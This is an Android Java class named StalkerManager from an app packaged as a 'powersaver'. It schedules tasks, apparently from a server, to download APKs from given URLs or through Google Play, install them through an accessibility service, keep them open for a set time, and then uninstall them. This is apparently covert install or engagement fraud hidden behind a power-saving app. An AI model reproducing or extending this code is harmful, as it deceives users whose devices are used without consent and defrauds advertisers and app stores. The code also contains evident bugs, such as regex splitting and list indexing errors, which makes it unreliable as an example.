package com.luna.powersaver.gp.manager;

import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.luna.powersaver.gp.common.StaticConst;
import com.luna.powersaver.gp.entity.JsonAppInfo;
import com.luna.powersaver.gp.http.DownloadManager;
import com.luna.powersaver.gp.http.bean.DownloadInfo;
import com.luna.powersaver.gp.service.NBAccessibilityService;
import com.luna.powersaver.gp.utils.AppDebugLog;
import com.luna.powersaver.gp.utils.AppInfoUtil;
import com.luna.powersaver.gp.utils.DBUtil;
import com.luna.powersaver.gp.utils.FileUtil;
import com.luna.powersaver.gp.utils.JsonUtil;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 为了操作方便，暂时实行同一时间一个任务 <br />
 * 此处工作基本都在线程执行 <br />
 * Created by zsigui on 17-1-18.
 */

public class StalkerManager implements DownloadInfo.DownloadListener {

    private static StalkerManager sInstance;

    public static StalkerManager get() {
        if (sInstance == null) {
            sInstance = new StalkerManager();
        }
        return sInstance;
    }

    private static final int DEFAULT_OPEN_TIME = 5 * 60;
    /**
     * 当前正在执行的任务
     */
    public JsonAppInfo pCurrentWorkInfo;
    // 全部任务列表
    private HashMap<String, JsonAppInfo> sTotalMap = new HashMap<>();
    private ArrayList<JsonAppInfo> sWaitingList = new ArrayList<>();

    /**
     * 移除废除的任务，建议线程中执行
     */
    public void removeOldTask(String oldpkgs) {
        if (TextUtils.isEmpty(oldpkgs)) {
            return;
        }
        String[] oldpkgArr = oldpkgs.split("|");
        JsonAppInfo tmp;
        for (String pkg : oldpkgArr) {
            if (TextUtils.isEmpty(pkg))
                continue;

            if (pCurrentWorkInfo != null && pCurrentWorkInfo.pkg.equals(pkg)) {
                // 当前任务需要废除
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DISCARD;
                pCurrentWorkInfo = null;
                DBUtil.setWorkingInfo(null);
            }
            // totalMap 跟 finishedSet 不废除，保留记录？
            for (int i = sWaitingList.size(); i > 0; i--) {
                tmp = sWaitingList.get(i);
                if (tmp == null) {
                    sWaitingList.remove(i);
                } else if (pkg.equals(tmp.pkg)) {
                    sWaitingList.remove(i);
                    sTotalMap.remove(pkg);
                }
            }
        }
    }

    /**
     * 判断并添加新增的任务，建议线程中执行
     */
    public void addNewTask(ArrayList<JsonAppInfo> newpkgs) {
        JsonAppInfo old;
        for (JsonAppInfo info : newpkgs) {
            if (info == null)
                continue;
            old = sTotalMap.get(info.pkg);
            if (old == null) {
                sWaitingList.add(info);
                sTotalMap.put(info.pkg, info);
            } else {
                if (old.execState != JsonAppInfo.EXC_STATE.FINISHED
                        || (old.endtime < info.starttime)) {
                    // 任务没完成或者需要重置
                    old.starttime = info.starttime;
                    old.endtime = info.endtime;
                    old.task = info.task;
                    if (old.execState != JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD) {
                        sWaitingList.add(old);
                    }
                    old.execState = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
                }
            }
        }
    }

    public void doStartAfterShowView() {
    }

    /**
     * 实际开始执行任务，
     */
    public void doStart() {
        if (!NBAccessibilityService.sIsInWork) {
            return;
        }

        if (pCurrentWorkInfo != null) {
            // 确保一致
            pCurrentWorkInfo = sTotalMap.get(pCurrentWorkInfo.pkg);
            if (pCurrentWorkInfo != null) {
                switch (pCurrentWorkInfo.execState) {
                    case JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD:
                    case JsonAppInfo.EXC_STATE.DOWNLOADING:
                    case JsonAppInfo.EXC_STATE.DOWNLOADED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            // 已经安装了，转换状态
                            doContinueAfterInstalled();
                        }
                        return;
                    case JsonAppInfo.EXC_STATE.INSTALLED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            doContinueAfterInstalled();
                        }
                        return;
                    case JsonAppInfo.EXC_STATE.OPENED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            doContinueAfterOpened();
                        }
                        return;
                    case JsonAppInfo.EXC_STATE.FINISHED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            pCurrentWorkInfo = null;
                        }
                        break;
                }
            }
        }

        // 处理 pCurrentWorkInfo
        int i = sWaitingList.size() - 1;
        JsonAppInfo info;
        long curTime = System.currentTimeMillis() / 1000;

        info = sWaitingList.get(i);
        while (i > -1) {
            if (info == null) {
                sWaitingList.remove(i);
            } else if (curTime >= info.endtime) {
                // 已经超时，任务废弃
                sWaitingList.remove(i);
                info.execState = JsonAppInfo.EXC_STATE.DISCARD;
            } else if (curTime > info.starttime) {
                // 还没到可以执行的时候，跳过
                break;
            }
            info = sWaitingList.get(--i);
        }
        if (info == null) {
            // 没有合适的任务，退出
            return;
        }

        pCurrentWorkInfo = info;
        NBAccessibilityService.sIsInWork = true;
        if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
            // 开始下载
            DownloadInfo downloadInfo = new DownloadInfo();
            downloadInfo.setDownloadUrl(pCurrentWorkInfo.url);
            downloadInfo.setDestUrl(pCurrentWorkInfo.url);
            downloadInfo.setPackageName(pCurrentWorkInfo.pkg);
            DownloadManager.getInstance(StaticConst.sContext).startDownload(downloadInfo);
            // 需要等下载完之后回调
            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        } else if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_GP) {
            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
            AppInfoUtil.jumpToStore(StaticConst.sContext, pCurrentWorkInfo.pkg);
        }
        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADING;
        NBAccessibilityService.sCurrentWorkType = 0;
    }

    /**
     * 卸载完成后执行下一个任务
     */
    public void doContinueAfterUninstall() {
        // 卸载之后，则开始执行下一个任务
        NBAccessibilityService.sCurrentWorkType = 0;
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
            pCurrentWorkInfo = null;
        }
        doStart();
    }

    /**
     * 当APP检测已经安装，执行该步骤
     */
    public void doContinueAfterInstalled() {
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.INSTALLED;
        NBAccessibilityService.sCurrentWorkType = 0;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                }
                // 安装后不打开立即卸载
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    // 开启后台计时服务
                }
                break;
        }
    }

    /**
     * 处理APP打开过后的操作（根据累计时间继续打开或者下载完成等）
     */
    public void doContinueAfterOpened() {
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.OPENED;
        NBAccessibilityService.sCurrentWorkType = 0;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 一般该状态到不了这里
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                pCurrentWorkInfo = null;
                doStart();
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 一般该状态到不了这里
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    pCurrentWorkInfo = null;
                    doStart();
                }
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
                if (pCurrentWorkInfo.opentime > DEFAULT_OPEN_TIME) {
                    pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                    pCurrentWorkInfo = null;
                    doStart();
                } else {
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                    if (NBAccessibilityService.sIsInWork) {
                        AppInfoUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo.pkg);
                        // 开启后台计时服务
                    }
                }
                break;
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                if (pCurrentWorkInfo.opentime > DEFAULT_OPEN_TIME) {
                    AppInfoUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                } else {
                    if (NBAccessibilityService.sIsInWork) {
                        AppInfoUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo.pkg);
                        // 开启后台计时服务
                    }
                }
                break;
        }
    }

    /**
     * 下载完成后处理，由于通过GP会直接跳转安装完成，则GP下载该步是忽略的
     *
     * @param info
     */
    public void doContinueAfterDownloaded(DownloadInfo info) {
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        NBAccessibilityService.sCurrentWorkType = 0;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 删除包，然后不做其他操作
                DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 安装后不打开立即卸载
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.install(StaticConst.sContext,
                            DownloadManager.getInstance(StaticConst.sContext).getDownloadFile(info));
                }
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.INSTALL_MANUALLY;
                break;
        }
    }

    public void doContinueAfterSearch() {
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
        NBAccessibilityService.sCurrentWorkType = 0;
    }

    @Override
    public void onProgressUpdate(DownloadInfo info, int elapsedTime) {

    }

    @Override
    public void onFinishDownload(DownloadInfo info) {
        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADED;
        doContinueAfterDownloaded(info);
    }

    @Override
    public void onFailDownload(DownloadInfo info, String err) {
        // 下载失败，重置或者废弃？
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "下载失败: " + info.getPackageName() + ", url = "
                + info.getDownloadUrl() + ", err = " + err);
    }

    @Nullable
    private File getOrMkStoreDir() {
        File storeDir = FileUtil.getOwnCacheDirectory(StaticConst.sContext, StaticConst.STORE_DATA);
        if (!storeDir.exists() || !storeDir.isDirectory()) {
            boolean isSuccess = storeDir.mkdirs();
            if (!isSuccess) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "创建文件夹失败: " + storeDir.getAbsolutePath());
                return null;
            }
        }
        return storeDir;
    }

    /**
     * 保存任务状态，建议在线程中执行
     */
    public void saveCurrentTask() {
        File storeDir = getOrMkStoreDir();
        if (storeDir == null) return;
        truncateTotalMap();
        String json = JsonUtil.convertJsonAppInfoMapToJson(sTotalMap);
        FileUtil.writeData(new File(storeDir, "all"), json, false);
        json = JsonUtil.convertJsonAppInfoToJson(pCurrentWorkInfo);
        FileUtil.writeData(new File(storeDir, "key"), json, false);
    }

    /**
     * 提取任务状态，建议在线程中执行
     */
    public void restoreCurrentTask() {
        File storeDir = getOrMkStoreDir();
        if (storeDir == null) return;
        String json = FileUtil.readData(new File(storeDir, "all"));
        sTotalMap = JsonUtil.convertJsonStringToJsonAppInfoMap(json);
        sTotalMap = (sTotalMap == null ? new HashMap<String, JsonAppInfo>() : sTotalMap);
        json = FileUtil.readData(new File(storeDir, "key"));
        pCurrentWorkInfo = JsonUtil.convertJsonToJsonAppInfo(json);
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo = sTotalMap.get(pCurrentWorkInfo.pkg);
        }
        if (sWaitingList == null) {
            sWaitingList = new ArrayList<>();
        } else {
            sWaitingList.clear();
        }
        if (sTotalMap != null) {
            for (JsonAppInfo info : sTotalMap.values()) {
                if (info.execState != JsonAppInfo.EXC_STATE.FINISHED
                        && info.execState != JsonAppInfo.EXC_STATE.DISCARD) {
                    sWaitingList.add(info);
                }
            }
        }
    }


    private void truncateTotalMap() {
        int size = sTotalMap.size();
        if (size > 200) {
            // 尽量削减，最多一半
            Iterator<JsonAppInfo> it = sTotalMap.values().iterator();
            JsonAppInfo tmp;
            while (it.hasNext()) {
                tmp = it.next();
                if (tmp == null || tmp.execState == JsonAppInfo.EXC_STATE.DISCARD) {
                    it.remove();
                    size --;
                }
                if (size <= 100) {
                    break;
                }
            }
            if (size > 150) {
                it = sTotalMap.values().iterator();
                while (it.hasNext()) {
                    tmp = it.next();
                    if (tmp == null || tmp.execState == JsonAppInfo.EXC_STATE.FINISHED) {
                        it.remove();
                        size --;
                    }
                    if (size <= 100) {
                        break;
                    }
                }
            }
        }
    }

}
